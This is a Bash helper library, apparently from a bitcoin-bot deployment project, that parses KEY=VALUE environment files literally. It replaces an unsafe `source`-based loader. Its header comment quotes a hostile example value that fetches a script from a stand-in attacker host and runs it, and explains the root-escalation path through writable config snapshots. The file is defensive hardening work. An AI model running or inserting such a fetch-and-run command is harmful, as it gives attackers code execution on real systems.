# shellcheck shell=bash
# Strict, non-evaluating reader for KEY=VALUE environment files.
#
# WHY THIS EXISTS
#
# The privileged installers previously did:
#
#     set -a
#     source "$ENV_FILE"
#     set +a
#
# `source` makes Bash *interpret* the file. Every value is shell code, so a
# single line such as
#
#     COMMAND_HMAC_KEY=$(curl -s http://attacker/x | sh)
#
# executes as whatever user runs the installer. install_artifact.sh and
# install_monitoring.sh escalate through `as_root`, so that is root.
#
# The old mode check (`stat -c '%a' == 600`) constrained permissions but never
# ownership, and the rollback path sourced configuration snapshots under
# /var/lib/bitcoin-bot/config-snapshots, which oracle_setup.sh chowns to the
# unprivileged deployment user. Anyone able to write a snapshot could therefore
# execute arbitrary code as root during the next upgrade or rollback.
#
# These helpers never evaluate a value. Assignment uses `printf -v`, which
# writes the bytes literally, and every key is validated against a strict
# identifier pattern before it is used as a variable name.
#
# Regression coverage: tests/test_env_file_parser.py

env_file_fail() { echo "ERROR: $*" >&2; return 1; }

# env_file_require_trusted FILE
#
# A file that a privileged process is about to read must be a real file, not a
# symlink, owned by root, and not writable by group or other.
env_file_require_trusted() {
  local file=$1 owner mode
  [[ -f "$file" && ! -L "$file" ]] || {
    env_file_fail "environment file is missing or a symlink: $file"; return 1; }
  owner=$(stat -c '%u' "$file" 2>/dev/null) || {
    env_file_fail "cannot stat environment file: $file"; return 1; }
  [[ "$owner" == "0" ]] || {
    env_file_fail "environment file must be owned by root (uid 0), found uid $owner: $file"
    return 1; }
  mode=$(stat -c '%a' "$file" 2>/dev/null)
  mode=${mode: -3}
  case "$mode" in
    600|640|400|440) ;;
    *) env_file_fail "environment file must not be group- or world-writable (mode $mode): $file"
       return 1 ;;
  esac
  return 0
}

# _env_file_unquote NAME
#
# Strips one balanced layer of single or double quotes. Nothing is expanded.
_env_file_unquote() {
  local __name=$1 __v=${!1}
  if [[ ${#__v} -ge 2 ]]; then
    if [[ ${__v:0:1} == '"' && ${__v: -1} == '"' ]]; then
      __v=${__v:1:${#__v}-2}
    elif [[ ${__v:0:1} == "'" && ${__v: -1} == "'" ]]; then
      __v=${__v:1:${#__v}-2}
    fi
  fi
  printf -v "$__name" '%s' "$__v"
}

# env_file_get FILE KEY
#
# Prints the literal value of KEY, or returns 1 when absent. The last
# assignment wins, matching how `source` behaved for duplicate keys.
env_file_get() {
  local file=$1 want=$2 line key value found=1 result=''
  [[ "$want" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
    env_file_fail "invalid environment key requested: $want"; return 1; }
  while IFS= read -r line || [[ -n "$line" ]]; do
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || continue
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || continue
    [[ "$key" == "$want" ]] || continue
    value=${line#*=}
    _env_file_unquote value
    result=$value
    found=0
  done < "$file"
  [[ $found -eq 0 ]] || return 1
  printf '%s' "$result"
  return 0
}

# env_file_pairs FILE
#
# Emits NUL-separated KEY=VALUE records for use as literal `env` arguments:
#
#     while IFS= read -r -d '' kv; do args+=("$kv"); done < <(env_file_pairs f)
#     env -i "${args[@]}" some-command
#
# `env` treats each argument as data, so this replaces `set -a; source FILE`
# inside a clean-environment subshell without ever evaluating a value.
env_file_pairs() {
  local file=$1 line key value lineno=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    value=${line#*=}
    _env_file_unquote value
    printf '%s=%s\0' "$key" "$value"
  done < "$file"
  return 0
}

# env_file_load FILE
#
# Exports every well-formed KEY=VALUE pair, literally. A malformed key is
# rejected outright rather than skipped, so a corrupt or tampered file fails
# closed instead of silently loading a partial configuration.
env_file_load() {
  local file=$1 line key value lineno=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    value=${line#*=}
    _env_file_unquote value
    printf -v "$key" '%s' "$value"
    export "${key?}"
  done < "$file"
  return 0
}
